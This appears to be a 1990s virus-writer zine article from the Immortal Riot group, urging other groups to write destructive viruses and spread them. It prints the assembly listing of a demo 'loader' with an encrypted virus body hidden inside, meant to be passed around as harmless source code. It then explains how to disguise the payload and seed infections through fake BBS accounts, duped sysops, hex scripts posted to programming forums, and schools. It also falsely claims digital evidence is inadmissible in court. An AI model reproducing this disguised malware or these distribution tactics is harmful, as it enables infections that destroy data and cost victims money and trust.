@@ -1,0 +1,513 @@
+              What's happening with the virus writer's...
+              ===========================================
+  
+  It is apparent to even the blindest of observers that the "I create
+  only nice viruses" phonomenon has caught on. Everyone in nearly all 
+  groups have decided to create viruses as harmless as possible. 
+  Of'cos, no names will be mentioned, as that would be mean and we all 
+  wish for a happy world :-). Heh. Somehow reminding on Dark Angel
+  english, but no hard feelings DA, I admire your way of using the 
+  english language as much as your way of writing assembly language!
+  
+  Papers - correct
+  컴컴컴컴컴컴컴컴
+  Yeh. We all have heard from the papers, etc that all viruses are 
+  destructive, and heck they might (for once) be right! This will 
+  not to many virus writers agree me on, but think again (and again,
+  if necessary), and soon enough it will make perfect sense!
+  
+  I changed my mind concerning this after reading Ian Douglas three 
+  long articles posted (twice) on Fido-net. Thanks Ian ;-).
+  
+  I don't have a copy of his article, since I normally don't save
+  my mail from him, b'cos his opinion normally sucks bigtime. However,
+  I'm pretty sure you've read it atleast once, and I think I remember
+  it quite alright, so there's really no need for pure quotations.
+  
+  Computer viruses = destructive
+  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
+  I mean, a virus can harm people/programs/computers even if it wasn't
+  what it was meant to do. Let's give you an example: If company
+  "A" give a disk with some demo on to company "B" and the disk is
+  infected with a "un-destructive" virus like Yankee Doodle, company
+  "B" start it and 5.00 AM it starts to play a little tune. Company
+  B of'cos discovores and they soon enough find out that they got it
+  from compay "A". Now, isn't the trust of those companies harmed?
+  Definitely! The virus caused trouble, ie, it was (for them)
+  destructive!
+  
+  Also, let's say that company B was a hell of a big company, with a
+  networkd including 1500 comuters! Ok. I don't need to write about this,
+  I'll simply quote Approaching Zero (about the Eddie virus);
+  
+  "We lost $500,000 of business--really lost business, not orders 
+  deferred until we could catch up, but business that had to be done 
+  there and then or it went to a competitor," said the company's chief 
+  financial officer. "We also lost data. That cost us $20,000. But what 
+  really hurt was the lost business. If we force a customer into the 
+  hands of a competitor, he might go there again. I guess that could 
+  cost us another $500,000."
+  
+  Ok. Eddie was a destructive virus, but the main cost was b'cos of
+  they had to close down their entire network, the time it took to
+  wipe out the virus and then, re-install all programs. ...and not b'cos
+  it destroyed data.
+  
+  Also, if you say something like "But they should be able to detect
+  the Eddie virus, if they don't, they deserve to get struck with it!".
+  Yeh, right!? Oh well. If they first use anti-virus programs, those
+  greedy anti-virus-vendors earns money, and the company has to pay for
+  the program. The fear for getting struck with a virus has has already 
+  here costed them some cash. Heck, upgrades on anti-virus programs isn't
+  the cheapest! "And you gotta upgrade every month!" :-).
+  
+  So.. this was just a fiew view's out of the article Ian posted 
+  (there were like 50 more if you're interested!), and well I hope 
+  I've got you thinking.. 
+  
+  Bad influence
+  컴컴컴컴컴컴�
+  Then, why am I writing this article? To fill out the magazine?
+  To make Immortal Riot look cruel? No! What I'm trying to say to 
+  the other virus writers in the other groups is very simple:
+  
+  "Harmless viruses doesn't exist, so make them destructive!"
+  
+  Yeh. Wouldn't it be fun to see some nice pay-loads from the other
+  groups as well? Heck, imagine if NuKE, Phalcon/Skism and TridenT
+  started to create as annoying viruses as possible! ... and later
+  printed all of 굆 in their magazines! Wow. This would be something!
+  
+  However Immortal Riot are going the opposite direction, that is to
+  create destructive viruses and spread them as much as possible.
+  Therefor, I've outsmarted some ways of getting the viruses around.
+  
+  First, the secret is: fake logins (duh!). Yes, create as many different
+  accounts on as many boards as possible. But don't just upload infected
+  WaReZ that people (probably) will download and eventually run. Instead 
+  do something smarter, and more original! I've a few goodies up my 
+  sleeve that we actively use and I want to share with you.
+  
+  The first one is really brilliant :-). Ever heard of a ASM infector? :-)
+  Hehe. Okay, then, check this code out:
+  
+  ; ----------------- IMMORTAL RIOT ASM INFECTOR (GRIN) ------------------------
+  
+  ; Below is a dissassembly on the MAKE-UP-ONE-BBS-NAME! loader#1. Due to
+  ; the close down on the mentioned board, I hereby give you the source-
+  ; code, and my permission to alter it, use it, change the text, or 
+  ; whatever. It's nice to include in the ZIP packets!
+  ;
+  ; I'm sorry that I can't release the pure-source of this lame little
+  ; piece of shitty code, I lost it in one of my zillions HD-crashes.
+  ; Although it's coded in pure ASM, the code still sucks. IMO of'cos!
+  ;
+  ; The code is hardly commented, but if you know assembly, you should
+  ; be able to follow it, and if you're a non-programmer, just change the
+  ; text in the "data_0005" and get your very own little loader!
+  
+  ; For getting this to an executable COM file write:
+  ; tasm load#1.asm          ;Turbo Assembler Needed!
+  ; tlink /t load#1.obj	     ;As well as tlink (duh!)
+  ; ----------------------------------------------------------------------
+  data_13e	equ	2200h			;*
+  data_15e	equ	5006h			;* 
+  data_16e	equ	5107h			;*
+  data_17e	equ	5305h			;*
+  data_18e	equ	54B8h			;*
+  data_19e	equ	563Ah			;*
+  data_21e	equ	5E08h			;*
+  data_22e	equ	5F09h			;*
+  data_24e	equ	7AB4h			;*
+  data_25e	equ	8433h			;*
+  data_28e	equ	0B916h			;*
+  data_31e	equ	780h
+  data_32e	equ	0FA6Eh
+  
+  seg_a		segment	byte public
+  		assume	cs:seg_a, ds:seg_a
+  		org	100h                    ;* commie phile!
+  Intro  		proc	far
+  
+  start:
+                  db '먬Q'         	       ; Jmp to Loc_12
+  		mov	ax,0F000h
+  		mov	ds,ax
+  		mov	ax,cs
+  		mov	es,ax
+  		mov	di,offset data_2
+  		mov	si,data_32e
+  		mov	cx,1FCh
+  		rep	movsw		; Rep when cx >0
+  loc_1:
+  		mov	dx,3DAh
+  loc_2:
+  		in	al,dx		; port 3DAh, CGA/EGA vid status
+  		test	al,8
+  		jz	loc_2		; Jump if zero
+  		mov	ax,0A000h
+  		mov	es,ax
+  		mov	ds,ax
+  		mov	cx,9
+  		mov	bx,6402h
+  
+  locloop_3:
+  		push	cx
+  		mov	ax,bx
+  		add	ax,5
+  		mov	si,ax
+  		mov	di,bx
+  		mov	cx,9Fh
+  		rep	movsw		; Rep when cx >0
+  		add	bx,780h
+  		pop	cx
+  		loop	locloop_3	; Loop if cx > 0
+  
+  		mov	ax,cs
+  		mov	ds,ax
+  		mov	dx,0
+  		mov	si,offset data_2
+  		add	si,word ptr ds:[629h]
+  loc_4:
+  		mov	al,[si]
+  		and	al,byte ptr ds:[628h]
+  		jz	loc_5		; Jump if zero
+  		call	sub_2
+  loc_5:
+  		inc	si
+  		inc	dx
+  		cmp	dx,8
+  		jne	loc_4			; Jump if not equal
+  		ror	byte ptr ds:[628h],1	; Rotate
+  		cmp	byte ptr ds:[628h],80h
+  		nop
+  		jnz	loc_8			; Jump if not zero
+  loc_6:
+  		inc	word ptr ds:[626h]
+  		mov	si,word ptr ds:[626h]
+  		mov	al,data_5[si]
+  		cmp	al,0
+  		jne	loc_7			; Jump if not equal
+  		mov	word ptr ds:[626h],0
+  		jmp	short loc_6
+  loc_7:
+  		mov	bl,8
+  		mul	bl			; ax = reg * al
+  		mov	word ptr ds:[629h],ax
+  loc_8:
+  		in	al,60h		; port 60h, keybd scan or sw1
+  		cmp	al,1
+  		jne	loc_1		; Jump if not equal
+  		mov	ax,3
+  		int	10h		; Video display   ah=functn 00h
+  					;  set display mode in al
+  		mov	ah,4Ch
+  		int	21h		; DOS Services  ah=function 4Ch
+  					;  terminate with al=return code
+  data_2		dw	206 dup (0)
+  data_3		db	0	; Data table (indexed access)
+  		db	208 dup (0)
+  data_4		db	0
+  		db	398 dup (0)
+  data_5		db	20h	; Data table (indexed access)
+  		db	'THIS IS TEXT, IS JUST BLAH, BUT '
+  		db	'WHAT THE FUCK ARE YOU SUPPOSE   '
+  		db	'TO DO WHEN IMMORTAL RIOT INFECTS'
+  		db	' EVEN ASM-FILES (DUH).. HAHAHAHA'
+  		db	'HAHAHAHAH! '
+  		db	0
+  data_7		dw	0
+  data_8		db	80h
+  data_9		dw	100h
+  		db	'This is a intro..$'	; No shit Sherlock!
+  
+  Intro  		endp
+  
+  sub_2		proc	near
+  		mov	bx,653Fh
+  		mov	di,0
+  loc_9:
+  		add	bx,data_31e
+  		inc	di
+  		cmp	dx,di
+  		jge	loc_9		; Jump if > or =
+  		mov	cx,dx
+  		add	cl,1Ch
+  		mov	es:[bx],cl
+  		retn
+  sub_2		endp
+  
+  loc_12:
+  		nop
+  		nop
+  		mov	ax,0FA01h
+  		mov	dx,5945h
+  		int	16h		
+  		call	sub_3
+  
+  sub_3		proc	near
+  		pop	bp
+  		sub	bp,10Dh
+  		mov	ax,bp
+  		add	ax,11Ah
+  		push	ax
+  		jmp	short loc_14
+  		jmp	short $+2Fh
+  			                        
+  		push	si
+                db 00h,0e8h
+  		push	ss
+  		add	data_3[bx+di],bh
+  		lea	dx,[bp+0]	
+  		mov	ax,[bp+455h]
+  		inc	ah
+  		add	dx,ax
+  		mov	ah,40h
+  		int	21h		
+  					
+  					
+  		call	sub_4
+  		retn
+  sub_3		endp
+  
+  sub_4		proc	near
+  loc_14:
+  		mov	ax,[bp+11Ch]
+  		lea	si,[bp+149h]	; Load effective addr
+  		mov	cx,178h
+  
+  locloop_16:
+  		xor	[si],ax
+  		inc	si
+  		inc	si
+  		loop	locloop_16	; Loop if cx > 0
+  
+  		retn
+  sub_4		endp
+  
+  			                
+  		stosb		
+  		mov	ah,4Ch	
+  		db	 8Dh,0C0h, 39h, 52h,0CDh, 77h
+  		db	 8Dh,0E0h, 2Dh, 52h, 8Dh,0E8h
+  		db	 31h, 52h, 33h, 9Fh, 83h, 97h
+  		db	 02h,0A5h,0A5h,0E9h, 04h, 56h
+  		db	0B4h, 4Fh,0CDh, 77h, 3Dh, 59h
+  		db	 00h, 22h, 04h, 6Ah, 02h, 25h
+  		db	 03h,0BFh,0E6h, 56h, 3Ch, 50h
+  		db	 74h,0AFh,0B4h, 11h, 32h, 84h
+  		db	 8Dh,0E0h, 65h, 52h,0CDh, 77h
+  		db	0B9h, 51h, 00h,0DBh, 96h,0B3h
+  		db	 03h,0E2h, 4Eh, 9Bh, 21h, 25h
+  		db	 03h,0BFh, 4Ah, 57h,0B8h, 57h
+  		db	 43h, 7Dh,0C9h,0DBh, 96h, 01h
+  		db	 04h, 9Bh, 21h,0EEh, 02h, 6Bh
+  		db	0CDh, 77h, 93h,0E2h, 3Fh,0EFh
+  		db	 04h, 56h, 8Dh,0C0h, 2Dh, 52h
+  		db	0CDh, 77h, 8Bh,0A4h, 8Dh,0E0h
+  		db	 2Dh, 52h, 81h, 6Ah, 90h,0BFh
+  		db	 74h, 25h, 81h, 6Ah, 4Dh, 0Ch
+  		db	 74h, 3Bh, 81h, 6Ah, 5Ah, 1Bh
+  		db	 74h, 31h, 80h, 2Ah, 01h, 70h
+  		db	 74h, 37h, 81h, 6Ah, 90h,0C6h
+  		db	 74h, 0Dh, 8Bh,0D0h, 53h, 52h
+  		db	 3Dh,0C6h, 01h, 24h, 52h, 6Bh
+  		db	 18h,0A0h
+  		db	 77h, 1Bh
+  		db	 3Dh,0F3h, 06h, 22h, 48h,0D7h
+  		db	0BEh, 0Ah, 04h, 18h, 44h, 22h
+  		db	 40h,0EEh, 02h, 14h, 33h, 9Fh
+  		db	 33h, 84h,0CDh, 77h, 2Dh, 52h
+  		db	 00h, 91h, 86h, 63h, 04h,0C6h
+  		db	0E9h,0DFh, 86h, 61h, 04h,0EEh
+  		db	 00h, 14h,0CDh, 77h,0B4h, 16h
+  		db	0B9h, 52h, 00h,0DBh, 96h, 63h
+  		db	 04h, 9Bh, 21h,0EEh, 02h, 14h
+  		db	 33h, 9Fh, 33h, 84h,0CDh, 77h
+  		db	0B4h, 7Ah,0CDh, 77h, 02h, 80h
+  		db	 74h,0AEh, 89h,0C0h, 1Ch, 57h
+  		db	0E8h,0A5h,0FEh,0BDh, 01h, 11h
+  		db	 8Dh,0E0h, 4Fh, 52h, 8Bh, 5Ah
+  		db	 8Bh, 02h, 02h,0EEh, 01h, 01h
+  		db	0CDh
+  		db	77h
+  loc_18:
+  		mov	ah,68h
+  		int	77h			 
+  		mov	ax,4357h
+  		db	 64h,0EDh,0DCh, 8Eh, 18h, 04h
+  		db	0DBh, 96h, 01h, 04h, 9Bh, 21h
+  		db	 19h, 83h,0A9h, 00h, 22h, 3Fh
+  		db	0E2h, 4Fh,0BFh, 31h,0A9h,0B4h
+  		db	 7Ah,0CDh, 77h, 80h,0ACh, 32h
+  		db	 21h, 03h,0BFh, 83h, 56h,0B8h
+  		db	 57h, 03h,0EFh, 01h, 56h,0BAh
+  		db	0D6h, 00h,0DBh, 9Eh, 56h, 01h
+  		db	 9Bh, 13h,0ECh, 00h, 52h,0E8h
+  		db	 59h, 00h,0ECh, 10h, 52h,0E8h
+  		db	5Fh
+  		db	 00h,0ECh, 1Eh, 52h,0E8h, 55h
+  		db	 00h
+  		db	0BEh, 3Ah, 56h,0B4h, 6Ah,0B9h
+  		db	 50h, 00h, 9Bh
+  		db	 21h, 24h
+  loc_20:
+  		add	ds:data_24e[di],dx
+  		int	77h	
+  		sub	byte ptr ds:data_13e+1[si],63h
+  		loop	$+2Ch		
+  
+  		fwait			
+                db 21h,0d6h
+  		cli			
+  		dec	cx
+  		jz	loc_18		
+  		sub	word ptr ds:data_15e[si],6B74h
+  		sub	word ptr ds:data_16e[si],6174h
+  		sub	word ptr ds:data_21e[si],6774h
+  		sub	word ptr ds:data_22e[si],1474h
+  		sub	word ptr ds:data_17e[si],6A74h
+  		db	 8Dh,0E0h, 31h, 52h,0BFh, 56h
+  		db	 01h,0F3h,0A5h,0DBh, 96h
+  		db	33h
+  		db	 04h,0E2h, 3Bh, 9Bh, 21h,0EDh
+  		db	 00h, 57h, 53h, 65h,0C0h, 95h
+  
+  sub_7		proc	near
+  		mov	ah,6Dh		
+  		db	 8Dh,0C0h,0EDh, 55h,0CDh, 77h
+  		db	 72h,0F8h,0E9h,0CFh,0FEh,0BEh
+  		db	 27h, 56h, 8Bh, 95h,0B4h, 16h
+  		db	0B9h, 15h, 00h,0C6h, 8Dh,0C0h
+  		db	 70h, 55h
+  		db	0CDh, 77h,0B4h, 68h,0CDh, 77h
+  		db	0EBh, 92h,0E8h, 46h, 00h,0C5h
+  		db	0B4h, 16h,0B9h, 07h, 00h,0C6h
+  		db	 8Dh,0C0h, 1Fh, 55h,0CDh, 77h
+  		db	0E8h,0B1h,0FFh,0E2h, 3Ch,0EFh
+  		db	 00h, 56h, 8Dh,0C0h,0F0h, 55h
+  		db	0CDh, 77h,0C3h,0BEh, 04h, 56h
+  		db	0EBh
+  		db	 72h, 00h, 56h,0BEh, 7Fh, 01h
+  		db	0DDh
+  		db	 16h, 53h, 01h,0EFh, 14h, 56h
+  		db	 2Eh, 67h, 14h, 10h, 46h,0B4h
+  		db	0F9h, 95h,0E8h,0BDh,0FFh,0ECh
+  		db	 00h, 57h,0B4h, 16h,0B1h, 07h
+  		db	0CDh, 77h,0E8h, 89h,0FFh, 95h
+  		db	0BAh
+  
+  sub_9:
+  		sbb	ax,[bx+di]
+  		loop	$+50h		; Loop if cx > 0
+  
+  		fwait			; Wait til math done
+  		and	[di],sp
+  		add	ds:data_18e[di],dx
+  		cmp	ax,9EECh
+  		push	si
+  		int	77h		
+  		db	0C7h, 50h, 05h, 57h,0FAh, 56h
+  		db	 93h,0BEh,0D4h,0A9h,0B4h, 68h
+  		db	0CDh, 77h,0B4h, 19h,0EBh,0B7h
+  		db	 2Ah, 78h, 2Ah, 56h,0B0h, 54h
+  		db	0B9h, 21h, 07h,0EDh, 12h, 57h
+  		db	 99h, 9Bh, 26h,0A8h,0C0h, 6Ah
+  		db	 19h, 23h,0F7h, 95h
+  		db	'Ivh3r3b/ 7n8e. "h?svs3c"o$'
+  		db	' 7svt>evp$'
+  		db	'o&e$'
+  		db	't/ 9fvI'
+  		db	4
+  		db	'!vR3dvM3r5u$'
+  		db	'yv(5)v', 27h, 'o4vT>evU8f9r1i e8'
+  		db	'/'
+  		db	1Fh
+  		db	'm;o$'
+  		db	't7lvR?'
+  		db	 6Fh, 22h, 20h, 7Ch, 49h, 04h
+  		db	 2Eh, 15h, 4Fh, 1Bh, 00h
+  		db	'x.Vcl\2o%\=e/'
+  		db	'bxc9mVcl\'
+  		db	 37h, 75h, 22h, 6Fh
+  		db	 33h, 78h, 33h, 63h, 78h
+  		db	'b7tVcl\5o'
+  		db	'8f?gxs/sVcl\5'
+  		db	 6Fh, 3Bh, 6Dh, 37h, 6Eh, 32h
+  		db	 2Eh, 35h, 6Fh, 3Bh, 00h,0E6h
+  		db	 13h, 9Bh
+  		db	 10h,0C6h, 90h
+  		db	 06h,0C3h,0C6h
+  		db	0E9h, 07h, 05h
+  sub_7		endp
+  
+  
+  seg_a		ends
+  
+  		end	start
+;-------------------------------------------------------------------------------
+  
+  Creating an ASM infector
+  컴컴컴컴컴컴컴컴컴컴컴컴
+  Well, for getting an "infected" ASM-file, all you gotta do is code
+  a small, nice loader that you're sure people will use. Then, infect
+  it with your latest virus and dissassemble the (now) infected loader.
+  Then start to spread out the dissassembly of it in a package including
+  the compiler, the linker (My experience is that most people don't have
+  Tasm) as well as some nifty file_id.diz and .nfo file! This b'cos of
+  "normal" people don't look in the ASM files if they're being 
+  distributed as plain text files!
+  
+  Now, what's the problem with the above method?
+  
+  To the one's who know some assembly, the encrypted part (the virus) 
+  of the intro looks really dumb! But write somewhere that it's some 
+  sort of picture or data and you really hate the "include" command as 
+  well as including external files. Problem number one solved!
+  
+  Then, you must also change the first jump (Heck, this jumps to LOC_12, 
+  and that's not very normal!) to an ordinary "ascii-string". Those 
+  annoying problems are now solved and I bet you'll see lotsa pd and 
+  elite boards using your loader! Relax, smile and have a great laugh 
+  at them, when they spread your virus around! :)
+  
+  More ways of spreading
+  컴컴컴컴컴컴컴컴컴컴컴
+  Another good thing concerning the spreading is nearly the same.
+  Call up a board, yell for the sysop, and ask for some "AxX" (access).
+  They will (of'cos) ask you if you can upload some hot stuff to their
+  board first (They're all so fucking greedy!) and then, you'll receive
+  AXX!! (great, huh? Laugher!)
+  
+  Now, you got 굆! Tell them that you have a high phone-bill and can't 
+  trade as much as you want to (Yeh, right!) but instead, you can do 
+  other work for their board! For example a bbs-loader! Sure he tell you,
+  and bang! This sysop is being a virus-spreader (haha!). Then, one thing
+  to remember is if this: If they trace you, deny everything! There's
+  nothing they can do about it, b'cos digital evidence doesn't count in
+  the court! Sure, they can sue you, but go figure who will win? Smile!
+  
+  Getting the lamers
+  컴컴컴컴컴컴컴컴컴
+  Ok, one more way of spreading your virus... just dial a board up,
+  post a hex-script in the a programming net (Creative Demo Net for
+  instance), describe it as a new, fucking awesome demo routine that is
+  3 time faster than the one created by Future Crew! ...and if they
+  find it good, then they are welcome to receive the source code to
+  it. But what they don't know is that you've placed a G "go" at the end
+  of the hex-script :). Heh. The virus is run on their computer and
+  then they just say "Ah, what a lamer, this routine sucks!". Now, he's
+  infected and so is the rest of the people on that meeting. Fun, right?
+  
+  Creating publicity
+  컴컴컴컴컴컴컴컴컴
+  Ok. However, the best way of spreading viruses is naturally to infect
+  big schools (Lehigh, Chalmers, MIT, is good examples!) pd-disk-
+  distributors (like Tequila) and send infected programs on Internet.
+  
+  Well, actually a combination on all above spreading methods is surely
+  the best best way to create total chaos!! So, quit this Mr.Nice.Guy
+  image now, start to create destructive/malicious viruses and by darn,
+  spread them!
+  
+  			  = The Unforgiven =
